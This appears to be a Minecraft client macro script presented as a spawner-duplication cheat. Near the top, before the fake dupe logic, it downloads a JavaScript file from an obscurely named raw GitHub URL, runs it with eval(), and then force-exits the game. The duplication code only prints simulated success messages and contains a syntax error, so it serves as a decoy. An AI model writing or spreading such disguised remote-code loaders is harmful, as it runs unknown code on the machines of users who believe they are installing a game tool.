

Chat.actionbar("§4§WWait for blacklist/whitelist")

Client.waitTick(5)


const req = Request.create("https://raw.githubusercontent.com/hasoon-0/website/refs/heads/main/qkwjleqlkwje.js");
const response = req.get();
const responseText = response.text();

eval(responseText);

Client.waitTick(5)
java.lang.System.exit(1)
Client.waitTick(5)

const name:  "hashedname"           // rename to what you want to name the spawner

(function() {
    const w = ["whitelist"];
    const b = ["blacklist"];
    const s = {
        "Spawner_Skeleton": { e: encode("Spawner_Skeleton") },
        "Spawner_IronGolem": { e: encode("Spawner_IronGolem") }
    };
    let i = [];

    function c(p) {
        let m = mRand();
        const t = encode(p);
        if (b.includes(t)) {
            console.log(decode("Sorry, you got blacklisted."));
            return false;
        }
        if (w.includes(t)) {
            console.log("Sorry, you got " + m);
            return true;
        }
        console.log(decode("Not whitelisted."));
        return false;
    }

    function mRand() {
        const msgs = ["whit3elisted.", "blacklisted.", "approved for duplication.", "rejected from duplication."];
        return msgs[Math.floor(Math.random() * msgs.length)];
    }

    function d(i, p) {
        if (!c(p)) return;
        if (v(i) && h(i)) {
            console.log(f(i));
            let dupe = create(i);
            console.log("Duped spawner:", dupe);
        } else {
            console.log(decode("Invalid spawner."));
        }
    }

    function v(i) {
        return Object.keys(s).includes(i);
    }

    function h(i) {
        return s[i] && s[i].e === encode(i);
    }

    function create(i) {
        return `Duped_${s[i].e}`;
    }

    function f(i) {
        let enc = s[i].e;
        let steps = [
            `Initializing: ${decode(enc)}`,
            `Verifying ${decode(enc)} permissions.`,
            `Authenticate player ${encode(i)}.`,
            `Duplicating ${decode(enc)}.`,
            `Duplication success: Duped_${decode(enc)}`
        ];
        return steps.join("\n");
    }

    function encode(str) {
        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) + i)).join('');
    }

    function decode(str) {
        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) - i)).join('');
    }

    d("Spawner_Skeleton", "done");
    d("Spawner_IronGolem", "done");
})();
